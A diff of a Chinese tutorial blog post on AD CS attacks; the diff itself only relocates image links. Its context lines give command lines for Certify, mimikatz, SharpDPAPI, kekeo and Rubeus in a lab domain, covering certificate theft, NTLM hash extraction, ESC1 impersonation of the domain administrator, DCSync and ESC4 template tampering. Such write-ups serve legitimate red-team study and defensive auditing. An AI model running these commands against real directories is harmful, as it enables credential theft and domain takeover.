@@ -101,13 +101,13 @@ Microsoft 将 Active Directory 证书服务（AD CS）定义为 “*...the serve
 
 AD CS 在 LDAP 容器 ` CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 下的四个位置中定义了 AD 林信任的 CA 证书，每个都因用途而异：
 
-![](https://s2.loli.net/2022/03/24/asGDKZQoEwXUbtu.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/asGDKZQoEwXUbtu.png)
 
 - **Certification Authorities** 容器定义了受信任的根 CA 证书。这些 CAs 是位于 PKI 信任树层次结构的顶部，是 AD CS 环境中信任的基础。每个 CA 都表示为容器内的一个 AD 对象，其中 `objectClass` 属性被设置为 `CertificationAuthority`，并且 `cACertificate` 属性包含 CA 证书的二进制内容。Windows 将这些 CA 证书传播到每台 Windows 计算机上的受信任的根证书颁发机构证书存储区。为了使 AD 认为证书是可信的，证书的信任链最终必须以该容器中定义的根 CA 之一结束。
 
-![](https://s2.loli.net/2022/03/24/rvJDRmaLF79wIYV.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/rvJDRmaLF79wIYV.png)
 
-![](https://s2.loli.net/2022/03/24/fHW2Kwdo9MqX4uE.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/fHW2Kwdo9MqX4uE.png)
 
 - **Enrollment Services** 容器定义了每个企业 CA。每个企业 CA 都有一个具有以下属性的 AD 对象：
 
@@ -118,7 +118,7 @@ AD CS 在 LDAP 容器 ` CN=Public Key Services,CN=Services,CN=Configuration,DC=<
 
   在 AD 环境中，客户端与企业 CA 交互以根据证书模板中定义的设置去申请证书。企业 CA 证书传播到每台 Windows 计算机上的中间证书颁发机构证书存储区。
 
-![](https://s2.loli.net/2022/03/25/KTO5oByPdEIie3Q.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/KTO5oByPdEIie3Q.png)
 
 - **NTAuthCertificates** 容器定义了有资格颁发身份验证证书的 CA 证书。这个对象的 `objectClass` 属性值为 `certificateAuthority`，并且 `cACertificate` 属性定义了一个可信 CA 证书的二进制数组。加入 AD 的 Windows 机器将这些 CA 证书传播到每台机器上的中间证书颁发机构证书存储区。仅当 NTAuthCertificates 对象定义的 CA 签署了身份验证客户端的证书时，客户端应用程序才能使用证书向 AD 进行身份验证。
 
@@ -126,7 +126,7 @@ AD CS 在 LDAP 容器 ` CN=Public Key Services,CN=Services,CN=Configuration,DC=<
 
 要从 AD CS 获取证书，客户端需要经过⼀个称为注册的过程。概括地说，在注册期间，客户端首先根据前文讨论的 Enrollment  Services 容器中的对象找到企业 CA。然后，客户端生成一个公钥/私钥对，并将公钥、证书主题和证书模板名称等其他详细信息一起放入证书签名请求（CSR）消息中。然后，客户端使用其私钥签署 CSR，并将 CSR 发送到企业 CA 服务器。CA 服务器检查客户端是否可以请求证书。如果是，它会通过查找 CSR 中指定的证书模板 AD 对象来确定是否会颁发证书。CA 将检查证书模板 AD 对象的权限是否允许该账户获取证书。如果是，CA 将使用证书模板定义的 “蓝图” 设置（例如，EKU、加密设置和颁发要求等）并使用 CSR 中提供的其他信息（如果证书的模板设置允许）生成证书。CA 使用其私钥签署证书，然后将其返回给客户端。
 
-![](https://s2.loli.net/2022/03/25/wTzhCQOfIlK6rmE.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/wTzhCQOfIlK6rmE.png)
 
 CA 颁发的证书可以提供加密（例如，加密⽂件系统）、数字签名（例如，代码签名）和身份验证（例如，对 AD）等服务。本文将主要关注启用 AD 身份验证的证书，但请记住，攻击者可以滥用证书，而不仅仅是身份验证。
 
@@ -134,7 +134,7 @@ CA 颁发的证书可以提供加密（例如，加密⽂件系统）、数字�
 
 AD CS 企业 CA 颁发的证书应用了证书模板定义的 “蓝图” 设置。这些模板是注册策略和预定义证书设置的集合，包含诸如 “此证书有效期为多久？”、“证书用于什么？”、“如何指定证书的主题？”、“谁可以申请证书？”，以及许多其他设置。如下图所示，通过证书模板控制台 MMC 管理单元 `certtmpl.msc` 可以编辑证书模板：
 
-![](https://s2.loli.net/2022/03/25/yfF91qxvonO8Gul.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/yfF91qxvonO8Gul.png)
 
 AD CS 将可用的证书模板存储为 AD 对象，其 `objectClass` 属性为 `pKICertificateTemplate`，位于以下容器中：
 
@@ -160,7 +160,7 @@ CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=
 
 在证书模板控制台中，EKU 可以在模板的 “属性” → “扩展” → “应用程序策略” 下进行设置，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/X2NxDWTgwlvCHyu.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/X2NxDWTgwlvCHyu.png)
 
 ### 0.3.3 证书注册
 
@@ -168,7 +168,7 @@ CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=
 
 用户不一定要从每个定义的证书模板中获取证书。网络管理员首先创建证书模板，然后企业 CA 发布该模板，使客户可以注册。回想一下，AD CS 在 AD 中将企业 CA 注册为 `objectClass` 属性为 `pKIEnrollmentService` 的对象。AD CS 通过将模板的名称添加到对象的 `certificateTemplates` 属性来指定在企业 CA 上所启用的证书模板：
 
-![](https://s2.loli.net/2022/03/25/vtWrepFZD2s7TEx.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/vtWrepFZD2s7TEx.png)
 
 AD CS 使用两个安全描述符定义注册权限：一个在证书模板 AD 对象上，另一个在企业 CA 本身上。
 
@@ -189,15 +189,15 @@ $Acl.Access.Count
 $Acl.Access | where IdentityReference -match 'Domain Users'
 ```
 
-![](https://s2.loli.net/2022/03/25/EdFfRW7r2vQVahc.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/EdFfRW7r2vQVahc.png)
 
 管理员可以通过证书模板控制台 `certtmpl.msc` 配置证书模板权限，方法是右键点击 “模板”，选择 “属性”，然后查看 “ 安全” 选项卡，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/vbPnd1GAgQo5KSu.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/vbPnd1GAgQo5KSu.png)
 
 此外，企业 CA 也使用安全描述符定义注册权限，并可以取代证书模板定义的任何注册权限。企业 CA 上配置的安全描述符定义了这些权限，可以在证书颁发机构 MMC 管理单元 `certsrv.msc` 中查看，方法是右键单击选中的 CA，选择 “属性”，然后查看 “ 安全” 选项卡，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/yI9zC1hWYHkaJ3u.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/yI9zC1hWYHkaJ3u.png)
 
 所有的这些安全设置都将在 CA 服务器上的注册表 `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA NAME>` 中设置键值 `Security` 。
 
@@ -213,17 +213,17 @@ $Acl.Access | where IdentityReference -match 'Domain Users'
 
 在 Windows 机器上，用户可以使用 GUI 请求证书，方法是启动 `certmgr.msc`（用于申请用户证书）或 `certlm.msc`（用于申请计算机证书），右键单击 “个人”，选择 “所有任务”，选择 “申请新证书”，如下图所示。这将为用户提供企业 CA 已发布的、当前用户可用的证书模板。
 
-![](https://s2.loli.net/2022/03/25/7ILoSfvqmpkDXJB.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/7ILoSfvqmpkDXJB.png)
 
-![](https://s2.loli.net/2022/03/25/pRWr7byhGTgVsi9.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/pRWr7byhGTgVsi9.png)
 
 单击 “注册” 按钮后，Windows 将申请证书（默认情况下，使用实现 MS-WCCE 的 COM 对象），然后证书将出现在 “个人” 下的 “证书” 中，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/ZU7lpiH6L3udf8R.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/ZU7lpiH6L3udf8R.png)
 
 在企业 CA 方面，证书颁发机构 MMC 管理单元 `certsrv.msc` 中，将在 “颁发的证书” 下面显示已颁发的证书，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/36nG4ACFHwuXY9g.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/36nG4ACFHwuXY9g.png)
 
 还可以使用内置的 `certreq.exe` 命令或 PowerShell 的 `Get-Certificate` Cmdlet 进行证书注册。在非 Windows 机器上，客户端可以使用基于 HTTP 的接口来申请证书。
 
@@ -233,11 +233,11 @@ CA 颁发证书后，可以通过 `certsrv.msc` 吊销颁发的证书。默认�
 
 除了证书模板和企业 CA 访问控制限制之外，我们还可以看到用于控制证书注册的两个证书模板设置，这些被称为发布要求（Issuance Requirements），如下图所示。
 
-![](https://s2.loli.net/2022/03/25/KzgNLIMCZinv6sc.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/KzgNLIMCZinv6sc.png)
 
 第一个限制被称作 “CA 证书管理程序批准(C)”（CA certificate manager approval），开启开选项后，会在证书模板 AD 对象的 `msPKI-Enrollment-Flag` 属性上设置 `CT_FLAG_PEND_ALL_REQUESTS` (0x2) 位。这会将基于该模板的所有证书注册请求置于待处理状态（Pending Requests，在 certsrv.msc 的 “挂起的申请” 部分中可见），这需要证书管理员在颁发证书之前予以批准或拒绝，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/LfHIMZYaBVq2UGu.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/LfHIMZYaBVq2UGu.png)
 
 #### 0.3.3.4 注册代理、授权签名和应用程序策略
 
@@ -283,7 +283,7 @@ Secure Channel（Schannel）是 Windows 在建立 TLS/SSL 连接时利用的 SSP
 
 根据经验，似乎没有多少工具利用 LDAPS 的客户端证书身份验证。[Get-LdapCurrentUser](https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-LdapCurrentUser.ps1) 这个 Cmdlet 演示了如何使用 .NET 库向 LDAP 进行身份验证。该 Cmdlet 执行 LDAP “Who am I?” 显示当前验证用户的扩展操作，如下图所示。
 
-![image-20230224181503135](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230224181503135.png)
+![image-20230224181503135](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/image-20230224181503135.png)
 
 ### 0.3.4 AD CS 的枚举
 
@@ -295,9 +295,9 @@ Certify 可以枚举有关 AD CS 环境的有用配置和基础结构信息，�
 C:\Users\Marcus\Desktop> Certify.exe cas
 ```
 
-![](https://s2.loli.net/2022/03/25/Wu1zAix5JPNSonI.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Wu1zAix5JPNSonI.png)
 
-![](https://s2.loli.net/2022/03/25/a9VhTUHE6LkJrtc.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/a9VhTUHE6LkJrtc.png)
 
 此外，使用 `certutil.exe` 的 `-TCAInfo` 参数可以枚举企业 CA，相关命令如下，执行结果如下图所示。
 
@@ -305,7 +305,7 @@ C:\Users\Marcus\Desktop> Certify.exe cas
 C:\Users\Marcus\Desktop> certutil.exe -TCAInfo
 ```
 
-![](https://s2.loli.net/2022/03/25/8cUnrOyzqoTgQAP.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/8cUnrOyzqoTgQAP.png)
 
 证书模板在活动目录中是 `pKICertificateTemplate` 的子类，并存储模板的配置数据。企业 CA 通过将模板的名称添加到企业 CA 的 AD 对象的 `certificateTemplates` 属性中来发布一个模板，使其可供客户端注册。使用 Certify 的 `find` 命令，可以枚举企业 CA 并返回每个发布的证书模板的详细信息。
 
@@ -313,11 +313,11 @@ C:\Users\Marcus\Desktop> certutil.exe -TCAInfo
 C:\Users\Marcus\Desktop> Certify.exe find
 ```
 
-![](https://s2.loli.net/2022/03/25/5S1jKUZbwAy4Oad.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/5S1jKUZbwAy4Oad.png)
 
 此外，`certutil.exe -TCAInfo` 命令的输出包括每个企业 CA 已发布的证书模板，要获取有关每个可用证书模板的详细信息，可以使用 `certutil -v -dstemplate` 命令，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/Q6PL4T3VZDvdpMm.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Q6PL4T3VZDvdpMm.png)
 
 ## 0.4 证书窃取
 
@@ -335,7 +335,7 @@ C:\Users\Marcus\Desktop> Certify.exe find
 C:\Users\Marcus\Desktop> mimikatz.exe "crypto::capi" "crypto::certificates /export" exit
 ```
 
-![](https://s2.loli.net/2022/03/25/p6I29XoNY5SG4Tm.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/p6I29XoNY5SG4Tm.png)
 
 ### 0.4.2 User Certificate Theft via DPAPI – THEFT2
 
@@ -360,9 +360,9 @@ Windows 常将用户证书存储在注册表项 `HKEY_CURRENT_USER\SOFTWARE\Micr
 C:\Users\Marcus\Desktop> SharpDPAPI.exe certificates {GUID}:SHA1
 ```
 
-![](https://s2.loli.net/2022/03/25/hmlIJ4Lo2jDztxF.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/hmlIJ4Lo2jDztxF.png)
 
-![](https://s2.loli.net/2022/03/25/v8XcSJQ4aRKqtWE.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/v8XcSJQ4aRKqtWE.png)
 
 如果 SharpDPAPI 的执行结果中显示 “[!] Certificate can be used for client auth!”，则表示该证书允许域身份验证。此时，可以使用 SharpDPAPI 输出末尾显示的 openssl 命令将 .pem 转换为 .pfx，相关命令如下。一旦转换为 .pfx 文件，就可以通过 Rubeus 为该用户账户申请 TGT 并代表该用户进行域身份验证。在转换时需要输入一个自定义的密码，以保护生成的 .pfx 文件，该密码在后续 Rubeus 的利用过程中会用到。
 
@@ -380,9 +380,9 @@ SharpDPAPI 中带有 `/machine` 参数的 `certificates` 命令（需要在提�
 C:\Users\Marcus\Desktop> SharpDPAPI.exe certificates /machine
 ```
 
-![](https://s2.loli.net/2022/03/25/AyFxCiscvGhjuNg.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/AyFxCiscvGhjuNg.png)
 
-![](https://s2.loli.net/2022/03/25/ToS6fJham2eZPdW.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/ToS6fJham2eZPdW.png)
 
 如果 SharpDPAPI 的执行结果中显示 “[!] Certificate can be used for client auth!”，则表示该证书允许域身份验证。此时，可以使用 SharpDPAPI 输出末尾显示的 openssl 命令将 .pem 转换为 .pfx，相关命令如下。一旦转换为 .pfx 文件，就可以通过 Rubeus 为该机器账户申请 TGT 并代表该机器用户进行域身份验证。
 
@@ -405,7 +405,7 @@ C:\Users\Marcus\Desktop> SharpDPAPI.exe certificates /machine
 
 Certificate/PKINIT 的滥用为攻击者提供了一个额外的攻击方式——NTLM 凭证窃取。正如 [@gentilkiwi](https://twitter.com/gentilkiwi) 推文中所描述的那样：
 
-![](https://s2.loli.net/2022/03/25/7huEHdXv2AOteIU.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/7huEHdXv2AOteIU.png)
 
 Microsoft 在 MS-PKCA（Microsoft 的 Kerberos PKINIT 技术规范）的 “1.4 Relationship to Other Protocols” 部分中指出：
 
@@ -417,7 +417,7 @@ Microsoft 在 MS-PKCA（Microsoft 的 Kerberos PKINIT 技术规范）的 “1.4 
 C:\Users\Marcus\Desktop> kekeo.exe "tgt::pac /caname:pentest-DC01-CA /subject:Marcus /castore:current_user /domain:pentest.com" exit
 ```
 
-![](https://s2.loli.net/2022/03/25/GpyFBQTows7vPXO.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/GpyFBQTows7vPXO.png)
 
 即使用户将密码改了，通过证书也随时都可以获取 NTLM。将可以与窃取 AD CA 证书或接下来将介绍的伪造证书结合起来，将获取到的证书导入本地计算机上，然后通过代理进入内网，这样就可以随时获取受害用户的当前 NTLM Hash。
 
@@ -445,7 +445,7 @@ Certify 可以在 LDAP 中查询符合上述条件的可用模板，相关命令
 C:\Users\Marcus\Desktop> Certify.exe find /clientauth
 ```
 
-![](https://s2.loli.net/2022/03/25/ErQzVNX6pR7DWaO.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/ErQzVNX6pR7DWaO.png)
 
 如上所示，User 模板存在并且符合条件，其默认的有效期为一年，但我们经常看到使用的自定义模板会增加过期时间。值得注意的是，如果攻击者恶意注册此类模板，只要证书有效，即使用户更改密码，证书也可以作为该用户进行身份验证。
 
@@ -457,11 +457,11 @@ C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-C
 # Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME
 ```
 
-![](https://s2.loli.net/2022/03/25/2sVmad4UxWiIjLk.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/2sVmad4UxWiIjLk.png)
 
 需要注意的是，要想成功使用 Certify 的 `request` 命令，需要将 Certify 项目中生产的 DLL 依赖 Interop.CERTENROLLLib.dll 复制到 Certify.exe 的相同目录下。
 
-![](https://s2.loli.net/2022/03/25/YjSfHXiR8qE23tD.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/YjSfHXiR8qE23tD.png)
 
 成功执行后，将输出证书 + 私钥的 .pem 格式的文本块，需要使用前面提到过的 openssl 命令将其转换为与 Rubeus 兼容的 .pfx 格式。
 
@@ -475,11 +475,11 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Marcus /certificate:C:\Users\Marcus\cert.pfx /password:Passw0rd /ptt
 ```
 
-![](https://s2.loli.net/2022/03/25/Umz7MuDdhReQ4Px.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Umz7MuDdhReQ4Px.png)
 
 执行 `klist` 命令，可以看到当前主机内存中已保存了 Marcus 用户的 TGT 票据，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/n4jtVgOPidUX8za.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/n4jtVgOPidUX8za.png)
 
 由于证书是一个独立的身份验证凭证，即使用户重置密码，该证书仍然可以使用。结合前文中 “NTLM Credential Theft via PKINIT – THEFT5” 部分所介绍的技术，攻击者还可以持续获取帐户的 NTLM 哈希，攻击者可以使用该哈希通过传递哈希进行身份验证或破解以获取明文密码。 总体而言，这是一种不涉及 LSASS 的而实现长期凭证窃取的替代方法，并且可以在非提升的环境中进行。
 
@@ -495,7 +495,7 @@ C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-C
 # Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME /machine
 ```
 
-![](https://s2.loli.net/2022/03/25/qcFvEgtXbx14HQJ.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/qcFvEgtXbx14HQJ.png)
 
 后续的操作请参考 “Active User Credential Theft via Certificates – PERSIST1”。通过机器帐户证书，攻击者可以作为机器帐户进行 Kerberos 身份验证，以机器账户的身份完成特定操作。例如使用 Kerberos S4U 扩展协议，攻击者可以代表任何用户获得其他主机上一些服务（例如，CIFS、LDAP、HTTP、RPCSS 等）的 ST 票据。详情请参考我的另一篇博客：[*Abusing Domain Delegation to Attack Active Directory*](https://whoamianony.top/posts/domain-delegation-attack/)。
 
@@ -516,13 +516,13 @@ C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-C
 
 这里主要关注到最后一个配置条件。回想一下，在 AD 身份验证期间，AD 将使用证书的 subjectAltName（SAN）字段指定身份。因此，如果请求者可以在 CSR 中指定 SAN，则请求者可以以任何人（例如，域管理员用户）的身份请求证书。证书模板在其 AD 对象的 [`mspki-certificate-name-flag`](https://docs.microsoft.com/zh-tw/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1) 属性中指定请求者是否可以在其中指定 SAN。`mspki-certificate-name-flag` 属性是位掩码，如果存在 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，则请求者可以指定 SAN。在证书模板控制台 MMC 管理单元中，此值在模板的 “属性” 的 “使用者名称” 选项卡中进行设置，如下图所示，勾选 “在请求中提供(S)” 即可。
 
-![](https://s2.loli.net/2022/03/25/Mv5YanSlBeTrPdo.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Mv5YanSlBeTrPdo.png)
 
 上述这些配置允许低权限用户使用任意的 SAN 请求证书，导致低权限用户能够通过 Kerberos 或 SChannel 以域中的任何主体身份进行身份验证。
 
 指定 SAN 的能力是这种错误配置的症结所在。但该配置通常情况下是启用的。在证书模板控制台 MMC 管理单元中，如果管理员启用 “在请求中提供(S)” 选项，则会出现警告，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/rVhOuvKD6e9n4Qq.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/rVhOuvKD6e9n4Qq.png)
 
 但是，如果网络管理员不熟悉 PKI，他们很可能会为了使服务正常运行而忽略该警告。此外，网络管理员在创建自己的证书模板时，可能会复制 AD CS 附带的默认 WebServer 模板。WebServer 模板启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，然后如果网络管理员又添加了 “客户端身份验证” 或 “智能卡登录” 的EKU，则会发生上述的攻击的场景。
 
@@ -536,7 +536,7 @@ C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-C
 C:\Users\Marcus\Desktop> Certify.exe find /vulnerable
 ```
 
-![](https://s2.loli.net/2022/03/25/TdrHXASDL428atK.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/TdrHXASDL428atK.png)
 
 如上图所示，证书模板 VulnTemplate 在 `msPKI-Certificate-Name-Flag` 属性中启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，并且具有客户端身份验证的 EKU，并授予所有域用户注册权限。
 
@@ -552,7 +552,7 @@ C:\Users\Marcus\Desktop> AdFind.exe -b "CN=Configuration,DC=pentest,DC=com" -f "
 C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:VulnTemplate /altname:PENTEST\Administrator
 ```
 
-![](https://s2.loli.net/2022/03/25/AZ5eHSkVJtCRmj2.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/AZ5eHSkVJtCRmj2.png)
 
 如上图所示，成功为域管理员用户 Administrator 注册了一个证书。在使用 openssl 转换为 .pfx 格式后，这个证书允许我们通过以 Administrator 的身份请求一个 TGT，相关命令如下。
 
@@ -560,11 +560,11 @@ C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-C
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Administrator /certificate:C:\Users\Marcus\cert.pfx /password:Passw0rd /ptt
 ```
 
-![](https://s2.loli.net/2022/03/25/kXwtjmhaqrBc3uG.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/kXwtjmhaqrBc3uG.png)
 
 如上图所示，成功为 Administrator 请求到 TGT，并将其传递到当前机器的内存中，执行 `klist` 命令可以看到机器中保存的 TGT，然后我们可以使用它来访问域控制器，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/zdC8G3tZEU17roJ.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/zdC8G3tZEU17roJ.png)
 
 并且此时可以向域控执行 DCSync 操作并导出用户哈希，说明此时已经提升至了域管理权限，相关命令如下。
 
@@ -572,7 +572,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Administrator /certificate:C:\U
 C:\Users\Marcus\Desktop> mimikatz.exe "lsadump::dcsync /domain:pentest.com /user:PENTEST\Administrator" exit
 ```
 
-![](https://s2.loli.net/2022/03/25/qiJvOorEWYLISn3.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/qiJvOorEWYLISn3.png)
 
 ### 0.6.2 Misconfigured Certificate Templates - ESC2
 
@@ -619,11 +619,11 @@ AD CS 通过其 EKU 中带有证书申请代理 OID（1.3.6.1.4.1.311.20.2.1）�
 
 以下是匹配条件 1 的模板的示例：
 
-![](https://s2.loli.net/2022/03/25/Y6XUWMyD3J8NPdF.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Y6XUWMyD3J8NPdF.png)
 
 以下是匹配条件 2 的模板的示例：
 
-![](https://s2.loli.net/2022/03/25/xX5uyIOaPv3wk78.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/xX5uyIOaPv3wk78.png)
 
 此时，攻击者可以先请求注册代理证书 Vuln-EnrollmentAgent，相关命令如下。
 
@@ -631,7 +631,7 @@ AD CS 通过其 EKU 中带有证书申请代理 OID（1.3.6.1.4.1.311.20.2.1）�
 C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:Vuln-EnrollmentAgent
 ```
 
-![](https://s2.loli.net/2022/03/25/i7q6OAvJ9xzHX31.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/i7q6OAvJ9xzHX31.png)
 
 将得到的注册代理证书使用 openssl 转换为 .pfx 格式，然后，用它来代表另一个用户（例如域管理员用户）向允许域身份验证的模板发出证书注册请求，相关命令如下。
 
@@ -639,7 +639,7 @@ C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-C
 C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:Vuln-EnrollmentAgent-AuthorizedSignatures /onbehalfof:PENTEST\Administrator /enrollcert:Vuln-EnrollmentAgentCert.pfx /enrollcertpw:Passw0rd
 ```
 
-![](https://s2.loli.net/2022/03/25/geXjGHpbKv8QArT.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/geXjGHpbKv8QArT.png)
 
 如上图所示，成功为域管理员用户 Administrator 注册了一个证书。在使用 openssl 转换为 .pfx 格式后，这个证书允许我们通过以 Administrator 的身份请求一个 TGT，相关命令如下。
 
@@ -647,7 +647,7 @@ C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-C
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Administrator /certificate:C:\Users\Marcus\cert.pfx /password:Passw0rd /ptt
 ```
 
-![](https://s2.loli.net/2022/03/25/D2kN1sCrbj6TlPV.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/D2kN1sCrbj6TlPV.png)
 
 ### 0.6.4 Vulnerable Certificate Template Access Control - ESC4
 
@@ -657,7 +657,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Administrator /certificate:C:\U
 
 从安全角度来看，我们应该关心模板对象所拥有的 ACE 是证书模板中的 “完全控制”（Full Control）和 “写入”（Write）类权限，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/pJKVj2kGuU4onr9.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/pJKVj2kGuU4onr9.png)
 
 总的来说，攻击者关心的敏感权限如下表所示。
 
@@ -675,7 +675,7 @@ Certify 的 `find` 命令会枚举所有证书模板的访问控制条目（Bloo
 C:\Users\Marcus\Desktop> Certify.exe find
 ```
 
-![](https://s2.loli.net/2022/03/25/cM6mXPeOfEB1Rjz.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/cM6mXPeOfEB1Rjz.png)
 
 在途中可以看到，Authenticated Users 组的用户对 VulnAceTemplate 模板拥有 WriteProperty 权限，也就是说所有经过身份验证的用户都可以修改 VulnAceTemplate 对象的属性，执行以下命令，通过 [AdMod](http://www.joeware.net/freetools/tools/admod/) 在模板对象的 `mspki-certificate-name-flag` 属性中启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志。
 
@@ -683,11 +683,11 @@ C:\Users\Marcus\Desktop> Certify.exe find
 C:\Users\Marcus\Desktop> AdMod.exe -b "CN=VulnAceTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=pentest,DC=com" "msPKI-Certificate-Name-Flag::1"
 ```
 
-![](https://s2.loli.net/2022/03/25/2318jAxKrLigNhM.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/2318jAxKrLigNhM.png)
 
 执行后，将成功在模板对象 VulnAceTemplate 的 `mspki-certificate-name-flag` 属性中启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志，如下图所示。此时攻击者可以指定 SAN，为任何域用户申请证书，并用该证书进行域身份验证。
 
-![](https://s2.loli.net/2022/03/25/wtesPlRV6SBd79n.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/wtesPlRV6SBd79n.png)
 
 ### 0.6.5 Vulnerable PKI Object Access Control - ESC5
 
@@ -717,11 +717,11 @@ C:\Users\Marcus\Desktop> certutil -config "DC01.pentest.com\pentest-DC01-CA" -se
 C:\Users\Marcus\Desktop> certutil -config "DC01.pentest.com\pentest-DC01-CA" -getreg "policy\EditFlags"
 ```
 
-![](https://s2.loli.net/2022/03/25/AfEcOzsMP1LY3rw.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/AfEcOzsMP1LY3rw.png)
 
 Certify 的 `find` 命令也将尝试检查它枚举的每个 CA 证书颁发机构的这个标志值：
 
-![](https://s2.loli.net/2022/03/25/uoAWqHdF7yrVBsS.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/uoAWqHdF7yrVBsS.png)
 
